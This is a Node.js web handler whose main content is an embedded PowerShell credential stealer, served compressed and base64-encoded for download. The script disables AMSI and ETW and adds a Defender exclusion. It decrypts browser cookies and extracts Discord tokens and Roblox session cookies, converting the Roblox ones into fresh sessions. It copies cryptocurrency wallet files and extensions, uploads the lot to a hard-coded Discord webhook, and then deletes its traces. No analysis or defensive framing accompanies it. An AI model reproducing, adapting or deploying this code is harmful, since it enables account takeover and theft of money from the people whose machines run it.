const zlib = require('zlib');

const PAYLOAD = String.raw`$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$CR=[char]13;$LF=[char]10;$CRLF=$CR+$LF;$QQ=[char]34
function u($s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
$LS=u'TG9jYWwgU3RhdGU=';$LD=u'bGV2ZWxkYg==';$RB=u'LlJPQkxPU0VDVVJJVFk=';$TQ=u'ZFF3NHc5V2dYY1E=';$ME=u'dXNlcnMvQG1l';$AT=u'YXV0aGVudGljYXRpb24tdGlja2V0'
$wh='https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K'
$UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 1100)
$tmp=Join-Path $env:TEMP ('s'+[guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory $tmp -Force|Out-Null
try{Add-MpPreference -ExclusionPath $tmp -ErrorAction SilentlyContinue}catch{}
$R=New-Object System.Text.StringBuilder
function A($s){[void]$R.AppendLine($s)}
function P($m){try{$b=@{content=[string]$m}|ConvertTo-Json;Invoke-RestMethod $wh -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 15 -UseBasicParsing}catch{}}
function Send($p,$n,$ct){
 if(-not(Test-Path $p)){return}
 for($a=1;$a -le 3;$a++){
  try{
   $b=[guid]::NewGuid().ToString('N');$e=[Text.Encoding]::UTF8
   $head='--'+$b+$CRLF+'Content-Disposition: form-data; name='+$QQ+'file'+$QQ+'; filename='+$QQ+$n+$QQ+$CRLF+'Content-Type: '+$ct+$CRLF+$CRLF
   $pre=$e.GetBytes($head)
   $dat=[IO.File]::ReadAllBytes($p)
   $post=$e.GetBytes($CRLF+'--'+$b+'--'+$CRLF)
   $all=New-Object byte[] ($pre.Length+$dat.Length+$post.Length)
   [Array]::Copy($pre,0,$all,0,$pre.Length);[Array]::Copy($dat,0,$all,$pre.Length,$dat.Length);[Array]::Copy($post,0,$all,$pre.Length+$dat.Length,$post.Length)
   Invoke-WebRequest $wh -Method Post -ContentType 'multipart/form-data; boundary='+$b -Body $all -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop|Out-Null
   return
  }catch{Start-Sleep -Seconds (2*$a)}
 }
}
$X=$false
try{
Add-Type -AssemblyName System.Security -ErrorAction Stop
Add-Type -TypeDefinition @'
using System;using System.Runtime.InteropServices;using System.Text;
public class X{
 [StructLayout(LayoutKind.Sequential)]public struct D{public int cb;public IntPtr pb;}
 [DllImport("crypt32.dll",SetLastError=true,CharSet=CharSet.Unicode)]static extern bool CryptUnprotectData(ref D i,IntPtr d,IntPtr e,IntPtr r,IntPtr p,uint f,ref D o);
 [DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h,string p);
 [DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string n);
 [DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
 [DllImport("bcrypt.dll")]static extern uint BCryptOpenAlgorithmProvider(out IntPtr h,string a,string b,uint c);
 [DllImport("bcrypt.dll")]static extern uint BCryptSetProperty(IntPtr h,string p,byte[] v,int l,uint f);
 [DllImport("bcrypt.dll")]static extern uint BCryptGetProperty(IntPtr h,string p,byte[] v,int l,out int r,uint f);
 [DllImport("bcrypt.dll")]static extern uint BCryptGenerateSymmetricKey(IntPtr h,out IntPtr k,byte[] o,int ol,byte[] s,int sl,uint f);
 [DllImport("bcrypt.dll")]static extern uint BCryptDecrypt(IntPtr k,byte[] i,int il,byte[] p,byte[] n,int nl,byte[] o,int ol,out int r,uint f);
 [DllImport("bcrypt.dll")]static extern uint BCryptDestroyKey(IntPtr k);
 [DllImport("bcrypt.dll")]static extern uint BCryptCloseAlgorithmProvider(IntPtr h,uint f);
 public static void Patch(){
  try{IntPtr k=LoadLibrary("amsi.dll");IntPtr a=GetProcAddress(k,"AmsiScanBuffer");uint o;VirtualProtect(a,(UIntPtr)6,0x40,out o);Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3},0,a,6);}catch{}
  try{IntPtr n=LoadLibrary("ntdll.dll");IntPtr e=GetProcAddress(n,"EtwEventWrite");uint o;VirtualProtect(e,(UIntPtr)1,0x40,out o);Marshal.Copy(new byte[]{0xC3},0,e,1);}catch{}
 }
 public static byte[] U(byte[] b,uint f){
  IntPtr i=Marshal.AllocHGlobal(b.Length);Marshal.Copy(b,0,i,b.Length);
  D di=new D();di.cb=b.Length;di.pb=i;D o=new D();byte[] res=null;
  if(CryptUnprotectData(ref di,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,f|1,ref o)){res=new byte[o.cb];Marshal.Copy(o.pb,res,0,o.cb);}
  Marshal.FreeHGlobal(i);return res;
 }
 public static string G(byte[] key,byte[] b){
  IntPtr h=IntPtr.Zero,k=IntPtr.Zero;
  try{
   if(BCryptOpenAlgorithmProvider(out h,"AES",null,0)!=0)return null;
   byte[] m=Encoding.Unicode.GetBytes("ChainingModeGCM"+char.ToString((char)0));
   BCryptSetProperty(h,"ChainingMode",m,m.Length,0);
   int r;byte[] t=new byte[4];BCryptGetProperty(h,"ObjectLength",t,4,out r,0);
   byte[] o=new byte[BitConverter.ToInt32(t,0)];
   byte[] iv=new byte[28];Buffer.BlockCopy(b,3,iv,0,12);
   if(BCryptGenerateSymmetricKey(h,out k,o,o.Length,key,key.Length,0)!=0)return null;
   int top=Math.Min(b.Length-16,2000);
   for(int e=top;e>18;e--){
    int cl=e-15;byte[] ct=new byte[cl];Buffer.BlockCopy(b,15,ct,0,cl);
    Buffer.BlockCopy(b,e,iv,12,16);
    byte[] ob=new byte[cl];int res;
    if(BCryptDecrypt(k,ct,cl,null,iv,28,ob,cl,out res,0)==0&&res>1){string s=Encoding.UTF8.GetString(ob,0,res);if(s.Length>1)return s;}
   }
   return null;
  }finally{if(k!=IntPtr.Zero)BCryptDestroyKey(k);if(h!=IntPtr.Zero)BCryptCloseAlgorithmProvider(h,0);}
 }
}
'@ -ErrorAction Stop
try{[X]::Patch();P 'amsi : ok'}catch{}
$X=$true
}catch{P ('type : '+$_.Exception.Message)}
$L1=[Text.Encoding]::GetEncoding(28591)
function KeyUser($ud){
 $ls=$ud+'\'+$LS;if(-not(Test-Path $ls)){return $null}
 try{$j=Get-Content $ls -Raw|ConvertFrom-Json}catch{return $null}
 if(-not $j.os_crypt.encrypted_key){return $null}
 $b=[Convert]::FromBase64String($j.os_crypt.encrypted_key);$b=$b[5..($b.Length-1)]
 try{[X]::U($b,0)}catch{$null}
}
function KeyApp($ud){
 $ls=$ud+'\'+$LS;if(-not(Test-Path $ls)){return $null}
 try{$j=Get-Content $ls -Raw|ConvertFrom-Json}catch{return $null}
 if(-not $j.app_bound_encrypted_key){return $null}
 $b=[Convert]::FromBase64String($j.app_bound_encrypted_key);$b=$b[4..($b.Length-1)]
 $b=[X]::U($b,4);if(-not $b){return $null}
 try{[X]::U($b,0)}catch{$null}
}
function Dec($val,$ku,$ka){
 try{
  $s=$val
  switch($s.Length%4){2{$s+='=='}3{$s+='='}1{return $null}}
  $blob=[Convert]::FromBase64String($s)
  if($blob.Length -lt 35){return $null}
  $p=[Text.Encoding]::ASCII.GetString($blob[0..2])
  if($p -eq 'v20'){if(-not $ka){return $null};return [X]::G($ka,$blob)}
  if($p -eq 'v10' -or $p -eq 'v11'){if(-not $ku){return $null};return [X]::G($ku,$blob)}
  $null
 }catch{$null}
}
function GetCookies($db,$ku,$ka){
 $out=@()
 if(-not(Test-Path $db)){return $out}
 $c=Join-Path $tmp ([guid]::NewGuid().ToString('N')+'.db')
 Copy-Item $db $c -Force
 if(-not(Test-Path $c)){return $out}
 $txt=$L1.GetString([IO.File]::ReadAllBytes($c))
 foreach($m in [regex]::Matches($txt,'v(?:10|11|20)[A-Za-z0-9+/=]{20,}')){
  $v=Dec $m.Value $ku $ka
  if($v){
   $st=[Math]::Max(0,$m.Index-500);$h=''
   $hs=[regex]::Matches($txt.Substring($st,$m.Index-$st),'[a-z0-9\-]{2,60}\.(com|net|org|io|xyz|app|dev|gg|tv|me|co|uk|ru|de|fr|br|info|site|online|shop|link|click|top|store|cloud|fun|live)')
   if($hs.Count -gt 0){$h=$hs[$hs.Count-1].Value}
   $out+=[pscustomobject]@{H=$h;V=$v}
  }
 }
 Remove-Item $c -Force
 $out
}
function GetTokens($key,$base){
 $l=$base+'\'+$LS+'\..\'+$LD;if(-not(Test-Path $l)){return @()}
 $t=@()
 foreach($f in Get-ChildItem $l -File){
  if($f.Extension -ne '.ldb' -and $f.Extension -ne '.log'){continue}
  try{$txt=$L1.GetString([IO.File]::ReadAllBytes($f.FullName))}catch{continue}
  foreach($m in [regex]::Matches($txt,($TQ+':([A-Za-z0-9+/=]{40,})'))){
   $v=Dec $m.Groups[1].Value $key $null
   if($v -match '[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}'){$t+=$Matches[0]}
  }
  foreach($m in [regex]::Matches($txt,'[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}')){$t+=$m.Value}
 }
 $t|Select-Object -Unique
}
function FFCookies($db){
 $out=@()
 if(-not(Test-Path $db)){return $out}
 try{$txt=$L1.GetString([IO.File]::ReadAllBytes($db))}catch{return $out}
 foreach($m in [regex]::Matches($txt,'\.ROBLOSECURITY[\x00-\xff]{1,4}?([\x21-\x7e]{60,1500})')){
  $v=[regex]::Replace($m.Groups[1].Value,'\.(roblox\.com|rbxcdn\.com).*$','')
  if($v.Length -gt 60){$out+=$v}
 }
 $out|Select-Object -Unique
}
function FFTokens($dir){
 $t=@()
 if(-not(Test-Path $dir)){return $t}
 Get-ChildItem $dir -Recurse -File -ErrorAction SilentlyContinue|ForEach-Object{
  if($_.Length -gt 3000000){return}
  try{$txt=$L1.GetString([IO.File]::ReadAllBytes($_.FullName))}catch{return}
  foreach($m in [regex]::Matches($txt,'"token"\s*:\s*"([^"]{50,120})"')){$t+=$m.Groups[1].Value}
  foreach($m in [regex]::Matches($txt,'[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}')){$t+=$m.Value}
 }
 $t|Select-Object -Unique
}
function RB($c){
 try{
  $s=New-Object Microsoft.PowerShell.Commands.WebRequestSession
  $s.Cookies.Add((New-Object System.Net.Cookie($RB,$c,'/','.roblox.com')))
  $h=@{'User-Agent'=$UA}
  $usr=Invoke-RestMethod 'https://users.roblox.com/v1/users/authenticated' -WebSession $s -Headers $h -TimeoutSec 12 -UseBasicParsing
  if(-not $usr.name){return $null}
  $rb='?'
  try{$rb=(Invoke-RestMethod ('https://economy.roblox.com/v1/users/'+$usr.id+'/currency') -WebSession $s -Headers $h -TimeoutSec 12 -UseBasicParsing).robux}catch{}
  $tk=''
  try{Invoke-WebRequest ('https://auth.roblox.com/v1/'+$AT) -Method Post -WebSession $s -Headers @{'X-CSRF-TOKEN'='';Referer='https://www.roblox.com/';'User-Agent'=$UA} -UseBasicParsing -ErrorAction Stop|Out-Null}
  catch{$tk=[string]$_.Exception.Response.Headers['x-csrf-token']}
  $r=Invoke-WebRequest ('https://auth.roblox.com/v1/'+$AT) -Method Post -WebSession $s -Headers @{'X-CSRF-TOKEN'=$tk;Referer='https://www.roblox.com/';'User-Agent'=$UA} -UseBasicParsing
  $ti=$r.Headers['rbx-authentication-ticket']
  $r2=Invoke-WebRequest ('https://auth.roblox.com/v1/'+$AT+'/redeem') -Method Post -Body (@{authenticationTicket=$ti}|ConvertTo-Json) -ContentType 'application/json' -Headers @{RBXAuthenticationNegotiation='1';'User-Agent'=$UA} -UseBasicParsing
  $nc=([string]$r2.Headers['Set-Cookie'] -split ';')[0] -replace ('^\.'+$RB+'='),''
  return @{u=$usr;c=$nc;r=$rb}
 }catch{return $null}
}
try{
A '=== SYSTEM ==='
A ('user : {0}\{1}' -f $env:USERDOMAIN,$env:USERNAME)
A ('host : {0}' -f $env:COMPUTERNAME)
A ('time : {0:u}' -f (Get-Date))
try{A ('ip   : {0}' -f (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 10 -UseBasicParsing))}catch{}
A ''
$L=$env:LOCALAPPDATA;$AP=$env:APPDATA
$B=@(
 @{n='Chrome';p=$L+'\Google\Chrome\User Data'},
 @{n='Chrome Beta';p=$L+'\Google\Chrome Beta\User Data'},
 @{n='Chrome Dev';p=$L+'\Google\Chrome Dev\User Data'},
 @{n='Chrome Canary';p=$L+'\Google\Chrome SxS\User Data'},
 @{n='Edge';p=$L+'\Microsoft\Edge\User Data'},
 @{n='Edge Beta';p=$L+'\Microsoft\Edge Beta\User Data'},
 @{n='Edge Dev';p=$L+'\Microsoft\Edge Dev\User Data'},
 @{n='Edge Canary';p=$L+'\Microsoft\Edge SxS\User Data'},
 @{n='Brave';p=$L+'\BraveSoftware\Brave-Browser\User Data'},
 @{n='Brave Beta';p=$L+'\BraveSoftware\Brave-Browser-Beta\User Data'},
 @{n='Brave Nightly';p=$L+'\BraveSoftware\Brave-Browser-Nightly\User Data'},
 @{n='Vivaldi';p=$L+'\Vivaldi\User Data'},
 @{n='Yandex';p=$L+'\Yandex\YandexBrowser\User Data'},
 @{n='Chromium';p=$L+'\Chromium\User Data'},
 @{n='Thorium';p=$L+'\Thorium\User Data'},
 @{n='Opera';p=$AP+'\Opera Software\Opera Stable'},
 @{n='Opera GX';p=$AP+'\Opera Software\Opera GX Stable'},
 @{n='Opera Beta';p=$AP+'\Opera Software\Opera beta'},
 @{n='Opera Dev';p=$AP+'\Opera Software\Opera developer'}
)
$allCk=@();$allTk=@()
foreach($b in $B){
 if(-not(Test-Path $b.p)){continue}
 $ku=$null;$ka=$null
 if($X){$ku=KeyUser $b.p;$ka=KeyApp $b.p}
 $profs=@($b.p)
 Get-ChildItem $b.p -Directory -ErrorAction SilentlyContinue|Where-Object{$_.Name -eq 'Default' -or $_.Name -like 'Profile *'}|ForEach-Object{$profs+=$_.FullName}
 foreach($pr in ($profs|Select-Object -Unique)){
  foreach($rel in @($pr+'\Network\Cookies',$pr+'\Cookies')){
   foreach($c in (GetCookies $rel $ku $ka)){$allCk+=[pscustomobject]@{B=$b.n;H=$c.H;V=$c.V}}
  }
  foreach($t in (GetTokens $ku $pr)){$allTk+=$t}
 }
}
P ('stage : chromium '+$allCk.Count)
$F=@($AP+'\Mozilla\Firefox\Profiles',$AP+'\zen\Profiles',$AP+'\librewolf\Profiles',$AP+'\Waterfox\Profiles',$AP+'\floorp\Profiles')
foreach($fd in $F){
 if(-not(Test-Path $fd)){continue}
 Get-ChildItem $fd -Directory -ErrorAction SilentlyContinue|ForEach-Object{
  foreach($c in (FFCookies ($_.FullName+'\cookies.sqlite'))){$allCk+=[pscustomobject]@{B='Firefox';H='.roblox.com';V=$c}}
  foreach($t in (FFTokens ($_.FullName+'\storage\default'))){$allTk+=$t}
 }
}
P ('stage : gecko '+$allCk.Count)
foreach($d in @('discord','discordptb','discordcanary')){
 $dd=$AP+'\'+$d
 if(Test-Path $dd){$k=$null;if($X){$k=KeyUser $dd};foreach($t in (GetTokens $k $dd)){$allTk+=$t}}
}
$allTk=$allTk|Where-Object{$_}|Select-Object -Unique
$ck=$allCk|Where-Object{$_.V}|Select-Object -Unique
P ('stage : found '+$allTk.Count+' tk / '+$ck.Count+' ck')
$tokOut=@();$ckOut=@()
foreach($t in $allTk){
 try{
  $uu=Invoke-RestMethod ('https://discord.com/api/v9/'+$ME) -Headers @{Authorization=$t;'User-Agent'=$UA} -TimeoutSec 12 -UseBasicParsing
  $line=('{0}#{1} | {2} | id {3} | 2fa {4}' -f $uu.username,$uu.discriminator,$uu.email,$uu.id,$uu.mfa_enabled)
  A $line;A ('TOKEN: {0}' -f $t);A ''
  $tokOut+=$line;('TOKEN: '+$t);''
 }catch{}
}
if(-not $tokOut.Count){$tokOut+='none found'}
$seen=@()
foreach($c in ($ck|Where-Object{$_.H -like '*roblox*'})){
 if($seen -contains $c.V){continue};$seen+=$c.V
 $x=RB $c.V
 if($x){
  A ('USER : {0} (id {1}) | robux {2}' -f $x.u.name,$x.u.id,$x.r)
  A ('COOKIE (IP-bypassed): {0}' -f $x.c)
  A ('ORIGINAL [{0}]: {1}' -f $c.B,$c.V);A ''
  $ckOut+=('USER : {0} (id {1}) | robux {2} [{3}]' -f $x.u.name,$x.u.id,$x.r,$c.B)
  $ckOut+=('FRESH : '+$x.c);$ckOut+=('RAW   : '+$c.V);$ckOut+=''
 }
}
if(-not $seen.Count){$ckOut+='no roblox cookie found'}
A '=== ALL COOKIES ==='
foreach($c in $ck){A ('[{0}] {1} = {2}' -f $c.B,$c.H,$c.V);$ckOut+=('[{0}] {1} = {2}' -f $c.B,$c.H,$c.V)}
$tkTxt=Join-Path $tmp 'tokens.txt';$ckTxt=Join-Path $tmp 'cookies.txt'
$tokOut|Set-Content $tkTxt -Encoding UTF8
$ckOut|Set-Content $ckTxt -Encoding UTF8
$wdir=Join-Path $tmp 'w';New-Item -ItemType Directory $wdir -Force|Out-Null
$wp=@($AP+'\Exodus\exodus.wallet',$AP+'\Electrum\wallets',$AP+'\atomic\Local Storage\leveldb',$AP+'\Coinbase',$AP+'\Trust Wallet',$AP+'\Phantom',$L+'\Phantom',$AP+'\Binance',$AP+'\Ledger Live',$AP+'\Wasabi Wallet',$AP+'\Bitcoin\wallets',$AP+'\Ethereum\keystore',$AP+'\Coin98',$AP+'\Solflare',$AP+'\Guarda')
$exts=@{MetaMask='nkbihfbeogaeaoehlefnkodbefgpgknn';Phantom='bfnaelmomeimhlpmgjnjophhpkkoljpa';Trust='egjidjbpglichdcondbcbdnbeeppgdph';Coinbase='hnlfjmpnagjnfpkljghhgnpmlpcoimja';Binance='fhbohimaelbohpjbbldcngcnapndodjp';Keplr='dmkamcknogkgcdfhhbddcghachkejeap';Solflare='bhhhlbepdkbapadjdnnojkbgioiodbic';TronLink='ibnejdfjmmkpcnlpebklmnkoeoihofec';Yoroi='ffnlbdhecaflocmhejdebcbfcbjjljhd';Nami='lpfcbjgnfdnmbafgjonjliakdjobofnk'}
A '';A '=== WALLETS ==='
foreach($p in $wp){if(Test-Path $p){Copy-Item $p (Join-Path $wdir ([IO.Path]::GetFileName($p))) -Recurse -Force;A ('dir  : {0}' -f $p)}}
foreach($b in $B){
 if(-not(Test-Path $b.p)){continue}
 Get-ChildItem $b.p -Directory -ErrorAction SilentlyContinue|Where-Object{$_.Name -eq 'Default' -or $_.Name -like 'Profile *'}|ForEach-Object{
  foreach($k in $exts.Keys){
   $src=$_.FullName+'\'+$LS+'\..\'+$exts[$k]
   if(Test-Path $src){Copy-Item $src (Join-Path $wdir ('ext_'+$k+'_'+$b.n)) -Recurse -Force;A ('ext  : {0} [{1}]' -f $k,$b.n)}
  }
 }
}
$rp=Join-Path $tmp 'report.txt';$R.ToString()|Set-Content $rp -Encoding UTF8
$zp=Join-Path $tmp 'wallets.zip'
try{Compress-Archive ($wdir+'\*') $zp -Force -ErrorAction Stop}catch{}
P 'stage : send'
Send $rp ('report-'+$env:COMPUTERNAME+'.txt') 'text/plain'
Send $tkTxt ('tokens-'+$env:COMPUTERNAME+'.txt') 'text/plain'
Send $ckTxt ('cookies-'+$env:COMPUTERNAME+'.txt') 'text/plain'
Send $zp 'wallets.zip' 'application/zip'
P 'done'
}catch{P ('ERR: '+$_.Exception.Message+' (line '+$_.InvocationInfo.ScriptLineNumber+')')}
Start-Sleep 2
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue`;

module.exports = (req, res) => {
  const b = zlib.deflateRawSync(Buffer.from(PAYLOAD, 'utf8'));
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, max-age=0, must-revalidate');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.status(200).send(b.toString('base64'));
};
